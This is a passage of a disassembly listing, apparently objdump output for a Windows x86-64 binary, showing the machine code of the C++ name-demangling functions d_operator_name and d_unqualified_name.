   140003e79:	48 03 43 20          	add    0x20(%rbx),%rax
   140003e7d:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140003e84:	00 
   140003e85:	89 53 28             	mov    %edx,0x28(%rbx)
   140003e88:	48 85 c9             	test   %rcx,%rcx
   140003e8b:	0f 84 6c ff ff ff    	je     140003dfd <d_operator_name+0x8d>
   140003e91:	40 0f be d6          	movsbl %sil,%edx
   140003e95:	48 c7 40 04 00 00 00 	movq   $0x0,0x4(%rax)
   140003e9c:	00 
   140003e9d:	83 ea 30             	sub    $0x30,%edx
   140003ea0:	c7 00 34 00 00 00    	movl   $0x34,(%rax)
   140003ea6:	89 50 10             	mov    %edx,0x10(%rax)
   140003ea9:	48 89 48 18          	mov    %rcx,0x18(%rax)
   140003ead:	e9 4d ff ff ff       	jmp    140003dff <d_operator_name+0x8f>
   140003eb2:	41 80 fa 63          	cmp    $0x63,%r10b
   140003eb6:	0f 85 04 ff ff ff    	jne    140003dc0 <d_operator_name+0x50>
   140003ebc:	40 80 fe 76          	cmp    $0x76,%sil
   140003ec0:	0f 85 fa fe ff ff    	jne    140003dc0 <d_operator_name+0x50>
   140003ec6:	8b 51 4c             	mov    0x4c(%rcx),%edx
   140003ec9:	31 c0                	xor    %eax,%eax
   140003ecb:	8b 71 50             	mov    0x50(%rcx),%esi
   140003ece:	85 d2                	test   %edx,%edx
   140003ed0:	0f 94 c0             	sete   %al
   140003ed3:	89 41 50             	mov    %eax,0x50(%rcx)
   140003ed6:	e8 b5 ef ff ff       	call   140002e90 <d_type>
   140003edb:	8b 4b 50             	mov    0x50(%rbx),%ecx
   140003ede:	45 31 c9             	xor    %r9d,%r9d
   140003ee1:	49 89 c0             	mov    %rax,%r8
   140003ee4:	85 c9                	test   %ecx,%ecx
   140003ee6:	74 17                	je     140003eff <d_operator_name+0x18f>
   140003ee8:	ba 36 00 00 00       	mov    $0x36,%edx
   140003eed:	48 89 d9             	mov    %rbx,%rcx
   140003ef0:	e8 0b de ff ff       	call   140001d00 <d_make_comp>
   140003ef5:	89 73 50             	mov    %esi,0x50(%rbx)
   140003ef8:	48 83 c4 28          	add    $0x28,%rsp
   140003efc:	5b                   	pop    %rbx
   140003efd:	5e                   	pop    %rsi
   140003efe:	c3                   	ret
   140003eff:	ba 35 00 00 00       	mov    $0x35,%edx
   140003f04:	48 89 d9             	mov    %rbx,%rcx
   140003f07:	e8 f4 dd ff ff       	call   140001d00 <d_make_comp>
   140003f0c:	eb e7                	jmp    140003ef5 <d_operator_name+0x185>
   140003f0e:	66 90                	xchg   %ax,%ax

0000000140003f10 <d_unqualified_name>:
   140003f10:	41 56                	push   %r14
   140003f12:	41 55                	push   %r13
   140003f14:	41 54                	push   %r12
   140003f16:	55                   	push   %rbp
   140003f17:	57                   	push   %rdi
   140003f18:	56                   	push   %rsi
   140003f19:	53                   	push   %rbx
   140003f1a:	48 83 ec 40          	sub    $0x40,%rsp
   140003f1e:	4c 8b 25 4b fd 34 00 	mov    0x34fd4b(%rip),%r12        # 140353c70 <.refptr.__stack_chk_guard>
   140003f25:	48 89 d5             	mov    %rdx,%rbp
   140003f28:	4c 89 44 24 28       	mov    %r8,0x28(%rsp)
   140003f2d:	48 89 cb             	mov    %rcx,%rbx
   140003f30:	49 8b 14 24          	mov    (%r12),%rdx
   140003f34:	48 89 54 24 38       	mov    %rdx,0x38(%rsp)
   140003f39:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140003f3e:	e8 ad ee ff ff       	call   140002df0 <d_maybe_module_name>
   140003f43:	89 c7                	mov    %eax,%edi
   140003f45:	85 c0                	test   %eax,%eax
   140003f47:	0f 84 83 02 00 00    	je     1400041d0 <d_unqualified_name+0x2c0>
   140003f4d:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140003f51:	0f b6 02             	movzbl (%rdx),%eax
   140003f54:	3c 46                	cmp    $0x46,%al
   140003f56:	0f 84 94 01 00 00    	je     1400040f0 <d_unqualified_name+0x1e0>
   140003f5c:	8d 50 d0             	lea    -0x30(%rax),%edx
   140003f5f:	31 ff                	xor    %edi,%edi
   140003f61:	80 fa 09             	cmp    $0x9,%dl
   140003f64:	0f 86 9e 01 00 00    	jbe    140004108 <d_unqualified_name+0x1f8>
   140003f6a:	8d 50 9f             	lea    -0x61(%rax),%edx
   140003f6d:	80 fa 19             	cmp    $0x19,%dl
   140003f70:	0f 87 8a 00 00 00    	ja     140004000 <d_unqualified_name+0xf0>
   140003f76:	44 8b 6b 4c          	mov    0x4c(%rbx),%r13d
   140003f7a:	3c 6f                	cmp    $0x6f,%al
   140003f7c:	0f 84 56 02 00 00    	je     1400041d8 <d_unqualified_name+0x2c8>
   140003f82:	48 89 d9             	mov    %rbx,%rcx
   140003f85:	e8 e6 fd ff ff       	call   140003d70 <d_operator_name>
   140003f8a:	44 89 6b 4c          	mov    %r13d,0x4c(%rbx)
   140003f8e:	48 89 c6             	mov    %rax,%rsi
   140003f91:	48 85 c0             	test   %rax,%rax
   140003f94:	0f 84 c6 02 00 00    	je     140004260 <d_unqualified_name+0x350>
   140003f9a:	83 38 33             	cmpl   $0x33,(%rax)
   140003f9d:	0f 85 70 01 00 00    	jne    140004113 <d_unqualified_name+0x203>
   140003fa3:	48 8b 40 10          	mov    0x10(%rax),%rax
   140003fa7:	8b 4b 48             	mov    0x48(%rbx),%ecx
   140003faa:	8b 50 10             	mov    0x10(%rax),%edx
   140003fad:	48 8b 00             	mov    (%rax),%rax
   140003fb0:	8d 54 11 07          	lea    0x7(%rcx,%rdx,1),%edx
   140003fb4:	89 53 48             	mov    %edx,0x48(%rbx)
   140003fb7:	80 38 6c             	cmpb   $0x6c,(%rax)
   140003fba:	0f 85 53 01 00 00    	jne    140004113 <d_unqualified_name+0x203>
   140003fc0:	80 78 01 69          	cmpb   $0x69,0x1(%rax)
   140003fc4:	0f 85 49 01 00 00    	jne    140004113 <d_unqualified_name+0x203>
   140003fca:	80 78 02 00          	cmpb   $0x0,0x2(%rax)
   140003fce:	0f 85 3f 01 00 00    	jne    140004113 <d_unqualified_name+0x203>
   140003fd4:	48 89 d9             	mov    %rbx,%rcx
   140003fd7:	e8 c4 ea ff ff       	call   140002aa0 <d_source_name>
   140003fdc:	49 89 f0             	mov    %rsi,%r8
   140003fdf:	ba 38 00 00 00       	mov    $0x38,%edx
   140003fe4:	48 89 d9             	mov    %rbx,%rcx
   140003fe7:	49 89 c1             	mov    %rax,%r9
   140003fea:	e8 11 dd ff ff       	call   140001d00 <d_make_comp>
   140003fef:	48 89 c6             	mov    %rax,%rsi
   140003ff2:	e9 1c 01 00 00       	jmp    140004113 <d_unqualified_name+0x203>
   140003ff7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140003ffe:	00 00 
   140004000:	3c 44                	cmp    $0x44,%al
   140004002:	0f 84 f8 01 00 00    	je     140004200 <d_unqualified_name+0x2f0>
   140004008:	8d 50 bd             	lea    -0x43(%rax),%edx
   14000400b:	80 fa 01             	cmp    $0x1,%dl
   14000400e:	0f 86 2a 05 00 00    	jbe    14000453e <d_unqualified_name+0x62e>
   140004014:	3c 4c                	cmp    $0x4c,%al
   140004016:	0f 84 84 01 00 00    	je     1400041a0 <d_unqualified_name+0x290>
   14000401c:	3c 55                	cmp    $0x55,%al
   14000401e:	0f 85 ac 01 00 00    	jne    1400041d0 <d_unqualified_name+0x2c0>
   140004024:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004028:	0f b6 50 01          	movzbl 0x1(%rax),%edx
   14000402c:	80 fa 6c             	cmp    $0x6c,%dl
   14000402f:	0f 84 6b 03 00 00    	je     1400043a0 <d_unqualified_name+0x490>
   140004035:	80 fa 74             	cmp    $0x74,%dl
   140004038:	0f 85 92 01 00 00    	jne    1400041d0 <d_unqualified_name+0x2c0>
   14000403e:	80 38 55             	cmpb   $0x55,(%rax)
   140004041:	0f 85 19 02 00 00    	jne    140004260 <d_unqualified_name+0x350>
   140004047:	48 8d 50 01          	lea    0x1(%rax),%rdx
   14000404b:	48 8b 74 24 28       	mov    0x28(%rsp),%rsi
   140004050:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140004054:	80 78 01 74          	cmpb   $0x74,0x1(%rax)
   140004058:	0f 85 02 02 00 00    	jne    140004260 <d_unqualified_name+0x350>
   14000405e:	48 8d 50 02          	lea    0x2(%rax),%rdx
   140004062:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   140004066:	0f b6 40 02          	movzbl 0x2(%rax),%eax
   14000406a:	3c 5f                	cmp    $0x5f,%al
   14000406c:	0f 84 b8 04 00 00    	je     14000452a <d_unqualified_name+0x61a>
   140004072:	3c 6e                	cmp    $0x6e,%al
   140004074:	0f 84 cd 04 00 00    	je     140004547 <d_unqualified_name+0x637>
   14000407a:	48 89 d9             	mov    %rbx,%rcx
   14000407d:	e8 de dd ff ff       	call   140001e60 <d_number>
   140004082:	83 c0 01             	add    $0x1,%eax
   140004085:	0f 88 d5 01 00 00    	js     140004260 <d_unqualified_name+0x350>
   14000408b:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   14000408f:	80 3a 5f             	cmpb   $0x5f,(%rdx)
   140004092:	0f 85 c8 01 00 00    	jne    140004260 <d_unqualified_name+0x350>
   140004098:	48 83 c2 01          	add    $0x1,%rdx
   14000409c:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400040a0:	8b 53 28             	mov    0x28(%rbx),%edx
   1400040a3:	3b 53 2c             	cmp    0x2c(%rbx),%edx
   1400040a6:	0f 8d b4 01 00 00    	jge    140004260 <d_unqualified_name+0x350>
   1400040ac:	48 63 f2             	movslq %edx,%rsi
   1400040af:	83 c2 01             	add    $0x1,%edx
   1400040b2:	48 c1 e6 05          	shl    $0x5,%rsi
   1400040b6:	48 03 73 20          	add    0x20(%rbx),%rsi
   1400040ba:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   1400040c1:	00 
   1400040c2:	89 53 28             	mov    %edx,0x28(%rbx)
   1400040c5:	89 46 10             	mov    %eax,0x10(%rsi)
   1400040c8:	8b 43 38             	mov    0x38(%rbx),%eax
   1400040cb:	c7 06 4a 00 00 00    	movl   $0x4a,(%rsi)
   1400040d1:	3b 43 3c             	cmp    0x3c(%rbx),%eax
   1400040d4:	0f 8d 86 01 00 00    	jge    140004260 <d_unqualified_name+0x350>
   1400040da:	48 8b 53 30          	mov    0x30(%rbx),%rdx
   1400040de:	48 63 c8             	movslq %eax,%rcx
   1400040e1:	83 c0 01             	add    $0x1,%eax
   1400040e4:	48 89 34 ca          	mov    %rsi,(%rdx,%rcx,8)
   1400040e8:	89 43 38             	mov    %eax,0x38(%rbx)
   1400040eb:	eb 26                	jmp    140004113 <d_unqualified_name+0x203>
   1400040ed:	0f 1f 00             	nopl   (%rax)
   1400040f0:	48 8d 42 01          	lea    0x1(%rdx),%rax
   1400040f4:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400040f8:	0f b6 42 01          	movzbl 0x1(%rdx),%eax
   1400040fc:	8d 50 d0             	lea    -0x30(%rax),%edx
   1400040ff:	80 fa 09             	cmp    $0x9,%dl
   140004102:	0f 87 62 fe ff ff    	ja     140003f6a <d_unqualified_name+0x5a>
   140004108:	48 89 d9             	mov    %rbx,%rcx
   14000410b:	e8 90 e9 ff ff       	call   140002aa0 <d_source_name>
   140004110:	48 89 c6             	mov    %rax,%rsi
   140004113:	4c 8b 4c 24 28       	mov    0x28(%rsp),%r9
   140004118:	4d 85 c9             	test   %r9,%r9
   14000411b:	74 13                	je     140004130 <d_unqualified_name+0x220>
   14000411d:	49 89 f0             	mov    %rsi,%r8
   140004120:	ba 57 00 00 00       	mov    $0x57,%edx
   140004125:	48 89 d9             	mov    %rbx,%rcx
   140004128:	e8 d3 db ff ff       	call   140001d00 <d_make_comp>
   14000412d:	48 89 c6             	mov    %rax,%rsi
   140004130:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004134:	80 38 42             	cmpb   $0x42,(%rax)
   140004137:	0f 84 33 01 00 00    	je     140004270 <d_unqualified_name+0x360>
   14000413d:	85 ff                	test   %edi,%edi
   14000413f:	75 3f                	jne    140004180 <d_unqualified_name+0x270>
   140004141:	48 85 ed             	test   %rbp,%rbp
   140004144:	74 16                	je     14000415c <d_unqualified_name+0x24c>
   140004146:	49 89 f1             	mov    %rsi,%r9
   140004149:	49 89 e8             	mov    %rbp,%r8
   14000414c:	ba 01 00 00 00       	mov    $0x1,%edx
   140004151:	48 89 d9             	mov    %rbx,%rcx
   140004154:	e8 a7 db ff ff       	call   140001d00 <d_make_comp>
   140004159:	48 89 c6             	mov    %rax,%rsi
   14000415c:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   140004161:	49 2b 04 24          	sub    (%r12),%rax
   140004165:	0f 85 ce 03 00 00    	jne    140004539 <d_unqualified_name+0x629>
   14000416b:	48 89 f0             	mov    %rsi,%rax
   14000416e:	48 83 c4 40          	add    $0x40,%rsp
   140004172:	5b                   	pop    %rbx
   140004173:	5e                   	pop    %rsi
   140004174:	5f                   	pop    %rdi
   140004175:	5d                   	pop    %rbp
   140004176:	41 5c                	pop    %r12
   140004178:	41 5d                	pop    %r13
   14000417a:	41 5e                	pop    %r14
   14000417c:	c3                   	ret
   14000417d:	0f 1f 00             	nopl   (%rax)
   140004180:	49 89 f0             	mov    %rsi,%r8
   140004183:	45 31 c9             	xor    %r9d,%r9d
   140004186:	ba 51 00 00 00       	mov    $0x51,%edx
   14000418b:	48 89 d9             	mov    %rbx,%rcx
   14000418e:	e8 6d db ff ff       	call   140001d00 <d_make_comp>
   140004193:	48 89 c6             	mov    %rax,%rsi
   140004196:	eb a9                	jmp    140004141 <d_unqualified_name+0x231>
   140004198:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000419f:	00 
   1400041a0:	48 83 43 18 01       	addq   $0x1,0x18(%rbx)
   1400041a5:	48 89 d9             	mov    %rbx,%rcx
   1400041a8:	e8 f3 e8 ff ff       	call   140002aa0 <d_source_name>
   1400041ad:	48 89 c6             	mov    %rax,%rsi
   1400041b0:	48 85 c0             	test   %rax,%rax
   1400041b3:	74 1b                	je     1400041d0 <d_unqualified_name+0x2c0>
   1400041b5:	48 89 d9             	mov    %rbx,%rcx
   1400041b8:	e8 63 de ff ff       	call   140002020 <d_discriminator>
   1400041bd:	85 c0                	test   %eax,%eax
   1400041bf:	0f 85 4e ff ff ff    	jne    140004113 <d_unqualified_name+0x203>
   1400041c5:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   1400041cc:	00 00 00 00 
   1400041d0:	31 f6                	xor    %esi,%esi
   1400041d2:	eb 88                	jmp    14000415c <d_unqualified_name+0x24c>
   1400041d4:	0f 1f 40 00          	nopl   0x0(%rax)
   1400041d8:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400041dc:	80 78 01 6e          	cmpb   $0x6e,0x1(%rax)
   1400041e0:	0f 85 9c fd ff ff    	jne    140003f82 <d_unqualified_name+0x72>
   1400041e6:	48 83 c0 02          	add    $0x2,%rax
   1400041ea:	c7 43 4c 00 00 00 00 	movl   $0x0,0x4c(%rbx)
   1400041f1:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400041f5:	e9 88 fd ff ff       	jmp    140003f82 <d_unqualified_name+0x72>
   1400041fa:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)
   140004200:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004204:	80 78 01 43          	cmpb   $0x43,0x1(%rax)
   140004208:	0f 84 82 02 00 00    	je     140004490 <d_unqualified_name+0x580>
   14000420e:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   140004212:	48 85 d2             	test   %rdx,%rdx
   140004215:	74 11                	je     140004228 <d_unqualified_name+0x318>
   140004217:	8b 0a                	mov    (%rdx),%ecx
   140004219:	85 c9                	test   %ecx,%ecx
   14000421b:	74 05                	je     140004222 <d_unqualified_name+0x312>
   14000421d:	83 f9 18             	cmp    $0x18,%ecx
   140004220:	75 06                	jne    140004228 <d_unqualified_name+0x318>
   140004222:	8b 4a 18             	mov    0x18(%rdx),%ecx
   140004225:	01 4b 48             	add    %ecx,0x48(%rbx)
   140004228:	0f b6 08             	movzbl (%rax),%ecx
   14000422b:	80 f9 43             	cmp    $0x43,%cl
   14000422e:	0f 84 8c 00 00 00    	je     1400042c0 <d_unqualified_name+0x3b0>
   140004234:	80 f9 44             	cmp    $0x44,%cl
   140004237:	75 27                	jne    140004260 <d_unqualified_name+0x350>
   140004239:	0f b6 70 01          	movzbl 0x1(%rax),%esi
   14000423d:	8d 4e d0             	lea    -0x30(%rsi),%ecx
   140004240:	80 f9 05             	cmp    $0x5,%cl
   140004243:	77 1b                	ja     140004260 <d_unqualified_name+0x350>
   140004245:	4c 8d 05 bc d3 34 00 	lea    0x34d3bc(%rip),%r8        # 140351608 <.rdata+0x208>
   14000424c:	0f b6 c9             	movzbl %cl,%ecx
   14000424f:	49 63 0c 88          	movslq (%r8,%rcx,4),%rcx
   140004253:	4c 01 c1             	add    %r8,%rcx
   140004256:	ff e1                	jmp    *%rcx
   140004258:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   14000425f:	00 
   140004260:	31 f6                	xor    %esi,%esi
   140004262:	e9 ac fe ff ff       	jmp    140004113 <d_unqualified_name+0x203>
   140004267:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000426e:	00 00 
   140004270:	4c 8b 6b 40          	mov    0x40(%rbx),%r13
   140004274:	66 66 2e 0f 1f 84 00 	data16 cs nopw 0x0(%rax,%rax,1)
   14000427b:	00 00 00 00 
   14000427f:	90                   	nop
   140004280:	48 83 c0 01          	add    $0x1,%rax
   140004284:	48 89 d9             	mov    %rbx,%rcx
   140004287:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000428b:	e8 10 e8 ff ff       	call   140002aa0 <d_source_name>
   140004290:	49 89 f0             	mov    %rsi,%r8
   140004293:	ba 4e 00 00 00       	mov    $0x4e,%edx
   140004298:	48 89 d9             	mov    %rbx,%rcx
   14000429b:	49 89 c1             	mov    %rax,%r9
   14000429e:	e8 5d da ff ff       	call   140001d00 <d_make_comp>
   1400042a3:	48 89 c6             	mov    %rax,%rsi
   1400042a6:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400042aa:	80 38 42             	cmpb   $0x42,(%rax)
   1400042ad:	74 d1                	je     140004280 <d_unqualified_name+0x370>
   1400042af:	4c 89 6b 40          	mov    %r13,0x40(%rbx)
   1400042b3:	e9 85 fe ff ff       	jmp    14000413d <d_unqualified_name+0x22d>
   1400042b8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400042bf:	00 
   1400042c0:	0f be 48 01          	movsbl 0x1(%rax),%ecx
   1400042c4:	80 f9 49             	cmp    $0x49,%cl
   1400042c7:	0f 84 28 02 00 00    	je     1400044f5 <d_unqualified_name+0x5e5>
   1400042cd:	44 8d 41 cf          	lea    -0x31(%rcx),%r8d
   1400042d1:	41 80 f8 04          	cmp    $0x4,%r8b
   1400042d5:	77 89                	ja     140004260 <d_unqualified_name+0x350>
   1400042d7:	48 83 c0 02          	add    $0x2,%rax
   1400042db:	44 8d 69 d0          	lea    -0x30(%rcx),%r13d
   1400042df:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400042e3:	8b 43 28             	mov    0x28(%rbx),%eax
   1400042e6:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   1400042e9:	0f 8d 71 ff ff ff    	jge    140004260 <d_unqualified_name+0x350>
   1400042ef:	48 63 f0             	movslq %eax,%rsi
   1400042f2:	83 c0 01             	add    $0x1,%eax
   1400042f5:	48 c1 e6 05          	shl    $0x5,%rsi
   1400042f9:	48 03 73 20          	add    0x20(%rbx),%rsi
   1400042fd:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   140004304:	00 
   140004305:	89 43 28             	mov    %eax,0x28(%rbx)
   140004308:	48 85 d2             	test   %rdx,%rdx
   14000430b:	0f 84 4f ff ff ff    	je     140004260 <d_unqualified_name+0x350>
   140004311:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   140004318:	00 
   140004319:	c7 06 07 00 00 00    	movl   $0x7,(%rsi)
   14000431f:	44 89 6e 10          	mov    %r13d,0x10(%rsi)
   140004323:	48 89 56 18          	mov    %rdx,0x18(%rsi)
   140004327:	e9 e7 fd ff ff       	jmp    140004113 <d_unqualified_name+0x203>
   14000432c:	b9 02 00 00 00       	mov    $0x2,%ecx
   140004331:	48 83 c0 02          	add    $0x2,%rax
   140004335:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140004339:	8b 43 28             	mov    0x28(%rbx),%eax
   14000433c:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   14000433f:	0f 8d 1b ff ff ff    	jge    140004260 <d_unqualified_name+0x350>
   140004345:	48 63 f0             	movslq %eax,%rsi
   140004348:	83 c0 01             	add    $0x1,%eax
   14000434b:	48 c1 e6 05          	shl    $0x5,%rsi
   14000434f:	48 03 73 20          	add    0x20(%rbx),%rsi
   140004353:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   14000435a:	00 
   14000435b:	89 43 28             	mov    %eax,0x28(%rbx)
   14000435e:	48 85 d2             	test   %rdx,%rdx
   140004361:	0f 84 f9 fe ff ff    	je     140004260 <d_unqualified_name+0x350>
   140004367:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   14000436e:	00 
   14000436f:	c7 06 08 00 00 00    	movl   $0x8,(%rsi)
   140004375:	89 4e 10             	mov    %ecx,0x10(%rsi)
   140004378:	48 89 56 18          	mov    %rdx,0x18(%rsi)
   14000437c:	e9 92 fd ff ff       	jmp    140004113 <d_unqualified_name+0x203>
   140004381:	b9 05 00 00 00       	mov    $0x5,%ecx
   140004386:	eb a9                	jmp    140004331 <d_unqualified_name+0x421>
   140004388:	b9 04 00 00 00       	mov    $0x4,%ecx
   14000438d:	eb a2                	jmp    140004331 <d_unqualified_name+0x421>
   14000438f:	b9 03 00 00 00       	mov    $0x3,%ecx
   140004394:	eb 9b                	jmp    140004331 <d_unqualified_name+0x421>
   140004396:	b9 01 00 00 00       	mov    $0x1,%ecx
   14000439b:	eb 94                	jmp    140004331 <d_unqualified_name+0x421>
   14000439d:	0f 1f 00             	nopl   (%rax)
   1400043a0:	80 38 55             	cmpb   $0x55,(%rax)
   1400043a3:	0f 85 b7 fe ff ff    	jne    140004260 <d_unqualified_name+0x350>
   1400043a9:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400043ad:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400043b1:	80 78 01 6c          	cmpb   $0x6c,0x1(%rax)
   1400043b5:	0f 85 a5 fe ff ff    	jne    140004260 <d_unqualified_name+0x350>
   1400043bb:	48 83 c0 02          	add    $0x2,%rax
   1400043bf:	48 8d 54 24 34       	lea    0x34(%rsp),%rdx
   1400043c4:	48 89 d9             	mov    %rbx,%rcx
   1400043c7:	c7 44 24 34 00 00 00 	movl   $0x0,0x34(%rsp)
   1400043ce:	00 
   1400043cf:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400043d3:	e8 f8 f8 ff ff       	call   140003cd0 <d_template_head>
   1400043d8:	44 8b 74 24 34       	mov    0x34(%rsp),%r14d
   1400043dd:	49 89 c5             	mov    %rax,%r13
   1400043e0:	45 85 f6             	test   %r14d,%r14d
   1400043e3:	0f 85 77 fe ff ff    	jne    140004260 <d_unqualified_name+0x350>
   1400043e9:	48 89 d9             	mov    %rbx,%rcx
   1400043ec:	e8 9f f5 ff ff       	call   140003990 <d_parmlist>
   1400043f1:	48 85 c0             	test   %rax,%rax
   1400043f4:	0f 84 66 fe ff ff    	je     140004260 <d_unqualified_name+0x350>
   1400043fa:	4d 85 ed             	test   %r13,%r13
   1400043fd:	0f 84 2e 01 00 00    	je     140004531 <d_unqualified_name+0x621>
   140004403:	49 89 45 18          	mov    %rax,0x18(%r13)
   140004407:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   14000440b:	80 3a 45             	cmpb   $0x45,(%rdx)
   14000440e:	0f 85 4c fe ff ff    	jne    140004260 <d_unqualified_name+0x350>
   140004414:	48 8d 42 01          	lea    0x1(%rdx),%rax
   140004418:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000441c:	0f b6 52 01          	movzbl 0x1(%rdx),%edx
   140004420:	80 fa 5f             	cmp    $0x5f,%dl
   140004423:	74 2a                	je     14000444f <d_unqualified_name+0x53f>
   140004425:	80 fa 6e             	cmp    $0x6e,%dl
   140004428:	0f 84 32 fe ff ff    	je     140004260 <d_unqualified_name+0x350>
   14000442e:	48 89 d9             	mov    %rbx,%rcx
   140004431:	e8 2a da ff ff       	call   140001e60 <d_number>
   140004436:	83 c0 01             	add    $0x1,%eax
   140004439:	41 89 c6             	mov    %eax,%r14d
   14000443c:	0f 88 1e fe ff ff    	js     140004260 <d_unqualified_name+0x350>
   140004442:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004446:	80 38 5f             	cmpb   $0x5f,(%rax)
   140004449:	0f 85 11 fe ff ff    	jne    140004260 <d_unqualified_name+0x350>
   14000444f:	48 83 c0 01          	add    $0x1,%rax
   140004453:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140004457:	8b 43 28             	mov    0x28(%rbx),%eax
   14000445a:	3b 43 2c             	cmp    0x2c(%rbx),%eax
   14000445d:	0f 8d fd fd ff ff    	jge    140004260 <d_unqualified_name+0x350>
   140004463:	48 63 f0             	movslq %eax,%rsi
   140004466:	83 c0 01             	add    $0x1,%eax
   140004469:	48 c1 e6 05          	shl    $0x5,%rsi
   14000446d:	48 03 73 20          	add    0x20(%rbx),%rsi
   140004471:	48 c7 46 04 00 00 00 	movq   $0x0,0x4(%rsi)
   140004478:	00 
   140004479:	89 43 28             	mov    %eax,0x28(%rbx)
   14000447c:	c7 06 48 00 00 00    	movl   $0x48,(%rsi)
   140004482:	4c 89 6e 10          	mov    %r13,0x10(%rsi)
   140004486:	44 89 76 18          	mov    %r14d,0x18(%rsi)
   14000448a:	e9 84 fc ff ff       	jmp    140004113 <d_unqualified_name+0x203>
   14000448f:	90                   	nop
   140004490:	48 83 c0 02          	add    $0x2,%rax
   140004494:	45 31 ed             	xor    %r13d,%r13d
   140004497:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000449b:	eb 19                	jmp    1400044b6 <d_unqualified_name+0x5a6>
   14000449d:	0f 1f 00             	nopl   (%rax)
   1400044a0:	49 89 43 18          	mov    %rax,0x18(%r11)
   1400044a4:	4d 85 ed             	test   %r13,%r13
   1400044a7:	0f 84 b3 fd ff ff    	je     140004260 <d_unqualified_name+0x350>
   1400044ad:	48 8b 43 18          	mov    0x18(%rbx),%rax
   1400044b1:	80 38 45             	cmpb   $0x45,(%rax)
   1400044b4:	74 32                	je     1400044e8 <d_unqualified_name+0x5d8>
   1400044b6:	48 89 d9             	mov    %rbx,%rcx
   1400044b9:	e8 e2 e5 ff ff       	call   140002aa0 <d_source_name>
   1400044be:	45 31 c9             	xor    %r9d,%r9d
   1400044c1:	ba 54 00 00 00       	mov    $0x54,%edx
   1400044c6:	48 89 d9             	mov    %rbx,%rcx
   1400044c9:	49 89 c0             	mov    %rax,%r8
   1400044cc:	4d 89 eb             	mov    %r13,%r11
   1400044cf:	e8 2c d8 ff ff       	call   140001d00 <d_make_comp>
   1400044d4:	49 89 c5             	mov    %rax,%r13
   1400044d7:	4d 85 db             	test   %r11,%r11
   1400044da:	75 c4                	jne    1400044a0 <d_unqualified_name+0x590>
   1400044dc:	48 89 c6             	mov    %rax,%rsi
   1400044df:	eb c3                	jmp    1400044a4 <d_unqualified_name+0x594>
   1400044e1:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   1400044e8:	48 83 c0 01          	add    $0x1,%rax
   1400044ec:	48 89 43 18          	mov    %rax,0x18(%rbx)
   1400044f0:	e9 1e fc ff ff       	jmp    140004113 <d_unqualified_name+0x203>
   1400044f5:	48 8d 50 01          	lea    0x1(%rax),%rdx
   1400044f9:	48 89 53 18          	mov    %rdx,0x18(%rbx)
   1400044fd:	0f be 50 02          	movsbl 0x2(%rax),%edx
   140004501:	8d 4a cf             	lea    -0x31(%rdx),%ecx
   140004504:	80 f9 04             	cmp    $0x4,%cl
   140004507:	0f 87 53 fd ff ff    	ja     140004260 <d_unqualified_name+0x350>
   14000450d:	48 83 c0 03          	add    $0x3,%rax
   140004511:	48 89 d9             	mov    %rbx,%rcx
   140004514:	44 8d 6a d0          	lea    -0x30(%rdx),%r13d
   140004518:	48 89 43 18          	mov    %rax,0x18(%rbx)
   14000451c:	e8 6f e9 ff ff       	call   140002e90 <d_type>
   140004521:	48 8b 53 40          	mov    0x40(%rbx),%rdx
   140004525:	e9 b9 fd ff ff       	jmp    1400042e3 <d_unqualified_name+0x3d3>
   14000452a:	31 c0                	xor    %eax,%eax
   14000452c:	e9 67 fb ff ff       	jmp    140004098 <d_unqualified_name+0x188>
   140004531:	49 89 c5             	mov    %rax,%r13
   140004534:	e9 ce fe ff ff       	jmp    140004407 <d_unqualified_name+0x4f7>
   140004539:	e8 e2 b7 00 00       	call   14000fd20 <__stack_chk_fail>
   14000453e:	48 8b 43 18          	mov    0x18(%rbx),%rax
   140004542:	e9 c7 fc ff ff       	jmp    14000420e <d_unqualified_name+0x2fe>
   140004547:	48 85 f6             	test   %rsi,%rsi
   14000454a:	0f 84 ed fb ff ff    	je     14000413d <d_unqualified_name+0x22d>
   140004550:	49 89 f1             	mov    %rsi,%r9
   140004553:	31 f6                	xor    %esi,%esi
